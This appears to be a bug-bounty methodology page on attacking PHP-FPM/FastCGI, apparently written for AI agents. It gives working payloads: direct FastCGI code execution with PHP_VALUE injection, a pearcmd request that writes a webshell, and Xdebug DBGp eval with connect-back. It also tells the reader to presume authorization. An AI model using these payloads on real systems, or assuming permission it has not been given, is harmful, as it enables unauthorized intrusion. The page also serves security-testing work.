---
technology: "PHP-FPM / FastCGI"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
family: web-platforms
evidence: "12 writeups (see ../internal coverage ledger)"
provenance: "corpus-mined from 12 writeups in the writeup corpus + upstream-verified: CVE.org CVE-2019-11043 record (PHP Group CNA: 7.1.x<7.1.33, 7.2.x<7.2.24, 7.3.x<7.3.11), php.net install.fpm + pool configuration references (listen, pm.status_path default unset, ping.path), serverfault/stackoverflow operator references for cgi-fcgi status invocation, public CVE-2025-49132/pearcmd PoCs and writeups (config-create argv technique, Debian vs /usr/local PEAR paths). Accessed 2026-11-12. Pass 2 extension 2026-11-12: Phase 8 (Xdebug remote debugging -> DBGp eval RCE) added — setting names/defaults/triggers verified against xdebug.org step-debugging and all-settings docs (XDEBUG_SESSION_START trigger + cookie, xdebug.client_port 9003 default, discover_client_host no-filter warning, X-Forwarded-For precedence); exploitation shape from a phpinfo-disclosed Xdebug 2.6.0 with remote support enabled."
---

Companion page: [[php-fpm|PHP-FPM / FastCGI overview]] — what the service is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# PHP-FPM / FastCGI Bug Bounty Methodology

**Scope:** PHP-FPM as a service — pool configuration, the FastCGI listener (TCP 9000 / unix sockets), front-proxy forwarding rules, the built-in status/ping pages, and FPM-environment PHP configuration (`PHP_VALUE`, `register_argc_argv`, `cgi.fix_pathinfo`), plus the Xdebug remote-debugger extension that rides the same PHP runtime (Phase 8). **Out of scope:** PHP-language bugs with no FPM dependency, the web servers themselves (http-proxy unit), specific CMS/app CVEs (wordpress/drupal units) — this file covers the layer that executes the PHP.

**Authorization:** presume written permission. Direct-FCGI phases execute code on the target as the pool user — that is full-foothold territory; a protocol probe that only sets `SCRIPT_NAME=/status` is safe, but plan anything beyond it like the shell it is.

## Decision tree (one screen)

1. FPM confirmed (process list, `X-Powered-By: PHP-FPM`, `502 Bad Gateway` behavior, nginx `fastcgi_pass`) → Phase 2.
2. Can read nginx config / pool.d → Phase 3 (config loot: listener location, pool identity, `fastcgi_split_path_info` presence).
3. Front is nginx + PHP 7.1–7.3 in CVE range + `fastcgi_split_path_info` anchored regexp → Phase 4 (CVE-2019-11043).
4. Any network/SSRF path to the listener (TCP port, not socket-only) → Phase 5 (direct FCGI protocol).
5. LFI on the box with `register_argc_argv=On` and PEAR installed → Phase 7 (pearcmd write-RCE).
6. `phpinfo()` shows `xdebug` with remote/debug mode enabled and the target can route back to you → Phase 8 (Xdebug DBGp RCE).

## Phase 1 — Fingerprinting

```bash
ps aux | grep php-fpm          # "php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)" (field-observed)
curl -sI http://example.com/   # X-Powered-By: PHP-FPM/7.1  (field-observed)
```

Port truth: `9000/tcp open cslistener?` is NOT evidence — bare 9000 listeners also occur for gRPC, authentik, and Portainer. Confirm with process output, `phpinfo()` artifacts, or the 502-behavior test below. A deliberately-crashable input (`?file[]=x` array-vs-string TypeError) answered by `502 Bad Gateway` means nginx's FPM worker died — PHP confirmed, execution-adjacent (field-observed).

## Phase 2 — Listener location

```bash
ss -tlnp | grep -E '9000|php'        # TCP-bound pools
ls -la /run/php/                     # socket-bound pools: php7.3-fpm-michael.sock (per-user!)
grep -R "fastcgi_pass\|listen " /etc/nginx/ /etc/php/*/fpm/pool.d/
```

Observed forms: unix socket `/run/php/php-fpm.sock`, per-app socket `/run/php-fpm-librenms.sock` (app-named), per-user socket `/run/php/php7.3-fpm-michael.sock` (a tenant boundary), internal TCP `127.0.0.1:9000` reachable only after pivot (field-observed). Docker stacks: `0.0.0.0:9000->9000` container maps.

## Phase 3 — Config loot table

- nginx block: `fastcgi_pass` (where), `fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name` vs `$realpath_root…` (path semantics), presence/shape of `fastcgi_split_path_info ^(.+\.php)(/.+)$` (CVE-2019-11043 gate), `include snippets/fastcgi-php.conf` / `fastcgi_params`.
- `pool.d/www.conf`: `user=`/`group=` (execution identity), `listen=` (TCP vs socket), `pm.status_path`, `ping.path`, `php_admin_value[]` hard limits (observed: one pool ran as user `victor`, upgrading a www-data foothold to a named user).
- `php.ini`: `cgi.fix_pathinfo`, `register_argc_argv`, `open_basedir`, `disable_functions`, `include_path` (PEAR location for Phase 7).

## Phase 4 — CVE-2019-11043 (nginx + fastcgi_split_path_info underflow)

Gates — ALL required (upstream CVE record; one observed engagement exploited them, another correctly rejected them):
1. nginx forwards to PHP-FPM with `fastcgi_split_path_info` using a regexp starting `^` and ending `$`;
2. `PATH_INFO` can be attacker-controlled (no `try_files` neutralization);
3. PHP 7.1.x < 7.1.33, 7.2.x < 7.2.24, or 7.3.x < 7.3.11.

Exploitation: the public Go exploit (phuip-fpizdam) drives the underflow by repeated requests with `%0a` in the path until a PHP value write lands in FCGI space — typically manifesting as `auto_prepend_file` execution. Field note: one engagement applied exactly these gates and correctly REJECTED the CVE (wrong front server) — record your negative gates too; they are report content.

## Phase 5 — Direct FastCGI protocol attack (SSRF / pivot / misbound listener)

Whoever connects to the listener IS the trusted peer. Requirements: TCP listener (SSRF/pivot reachable), one known readable PHP file path as the execution vehicle.

```bash
# status probe first (safe, no code exec): works even when pm.status_path is set
SCRIPT_NAME=/status SCRIPT_FILENAME=/status REQUEST_METHOD=GET cgi-fcgi -bind -connect 127.0.0.1:9000

# arbitrary PHP as the pool user (observed: fpm.py shape)
python3 fpm.py 127.0.0.1 /var/www/developers/index.php -c '<?php system("id");?>'
```

The FCGI client sets `SCRIPT_FILENAME` to the known file and injects `PHP_VALUE` (e.g. `auto_prepend_file=php://input` + `allow_url_include=On`) so the body executes regardless of the file's content. For SSRF-only access, gopher-payload generators (Gopherus fastcgi mode) serialize the same request as a `gopher://127.0.0.1:9000/...` URL. Any file works — the point is you control interpreter config, not file choice.

## Phase 6 — Status and ping pages

`pm.status_path` (default: unset) and `ping.path` answer to matching `SCRIPT_NAME`/`SCRIPT_FILENAME` — through the web server (`location ~ ^/(status|ping)$` fastcgi block) or via Phase 5's direct bind. Value: pool name, process-manager mode, active/idle counts, and per-request last-URI rows (info leak: request URIs include query strings). `?json` / `?html` change format. Report as low-severity info disclosure unless URIs carry secrets.

## Phase 7 — pearcmd.php: LFI → file-write → RCE

The PEAR CLI entry script turns an include-primitive into a file write, no FPM protocol needed (field-observed):

```text
GET /vulnerable-include?+config-create+/<payload.php>+&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd
payload form: <?=system($_GET[c]);?> written to a writable path (e.g. /tmp), then include it
```

Gates: `register_argc_argv=On` (query string becomes argv; check any exposed `phpinfo()`), PEAR present in `include_path` (Debian: `/usr/share/php/`; source/Docker builds: `/usr/local/lib/php/` — one engagement had to correct the path for an openSUSE layout `/usr/share/php/PEAR`). Success signal: response body starting `CONFIGURATION (CHANNEL PEAR.PHP.NET)` — the config dump itself. Stage 2 includes the written file; commands run as the FPM pool user (observed: `wwwrun`).

## Phase 8 — Xdebug remote debugging: the step debugger as RCE

Xdebug is the PHP debugger extension, not an FPM feature — it rides any PHP runtime — but it surfaces exactly where this file's loot lives: the `phpinfo()` page. A readable `info.php` shows the `xdebug` section with version and settings; the rows that matter:

```ini
; Xdebug 2.x names                            ; Xdebug 3.x names (renamed)
xdebug.remote_enable = 1                       xdebug.mode = debug
xdebug.remote_connect_back = 1                 xdebug.discover_client_host = 1
xdebug.remote_host = <ide-ip>                  xdebug.client_host = <ide-ip>
xdebug.remote_port = 9000                      xdebug.client_port = 9003
```

The connection direction is the whole bug: on a triggered request the **PHP process connects out to the "IDE"** and then speaks DBGp — a debugger protocol whose `eval` command executes arbitrary PHP as the web server user, with no authentication anywhere in the protocol. With connect-back enabled (`remote_connect_back`/`discover_client_host`) the extension connects to the address it believes the request came from — and `X-Forwarded-For` is consulted before `REMOTE_ADDR`, with upstream documenting that no filter exists: anybody who can reach the web server can start a session. Without connect-back it dials the configured `remote_host`/`client_host` (a stale developer workstation address is often still routable inside the network).

Trigger any PHP page with `?XDEBUG_SESSION_START=name` (this also sets the `XDEBUG_SESSION` cookie, so every subsequent request debugs; `xdebug.start_with_request=yes` in config makes even the trigger unnecessary), then drive the protocol from your listener:

```bash
./xdebug-shell.py --local-host=<your-ip-visible-to-target> --url=http://198.51.100.x/info.php
# DBGp init packet arrives on connect-back; eval payloads run as the web user
```

The field shape: a phpinfo page disclosing `Xdebug v2.6.0` with remote support enabled in its settings table, exploited from a pivoted position by pointing the tool at the VPN-side interface address. Requirements: the target must be able to route back to you (same segment, VPN, or tunnel address), and any PHP file serves as the trigger URL. Report as unauthenticated RCE; remediation is `xdebug.mode=off` (2.x: `xdebug.remote_enable=0`) or removing the extension from production images.

## Disclosure notes

- Direct-FCGI execution claims must name the listener path (socket vs TCP) and pool user from `pool.d` — "RCE as www-data" vs "as named user" changes severity.
- CVE-2019-11043: version-gate to the exact PHP patch levels and quote the nginx regexp; a `fastcgi_split_path_info` presence alone is not the bug.
- Status page disclosure: severity rides on whether request URIs contain secrets (tokens, API keys in GET).
- Negative gates are findings: "CVE-2019-11043 not applicable (Apache front)" is hardening-relevant and stops the next tester re-litigating it.

## Appendix A — Tool mapping (prose)

- **cgi-fcgi** (libfcgi) — raw FastCGI binds: status probes and parameter experiments with `-bind -connect <addr>`.
- **fpm.py / public FCGI exploit scripts** — direct-protocol PHP execution via `SCRIPT_FILENAME` + `PHP_VALUE` (field-confirmed shape).
- **Gopherus** — generates `gopher://` FastCGI payloads for SSRF-only access to TCP pools.
- **phuip-fpizdam** — the CVE-2019-11043 underflow exploit (Go).
- **xdebug-shell** (gteissier) — DBGp session driver for Phase 8: listens as the IDE on the connect-back address and sends `eval` payloads (field-observed).
- **curl** — status/ping pages, pearcmd stage requests (raw sockets or curl `--path-as-is` where encoding matters).
- **ps / ss / grep** — listener and pool discovery (`php-fpm: master process`, `ss -tlnp`, `/run/php/` sockets).
- **hashcat / John** — out of scope here; FPM loot is config and identity, not hashes.
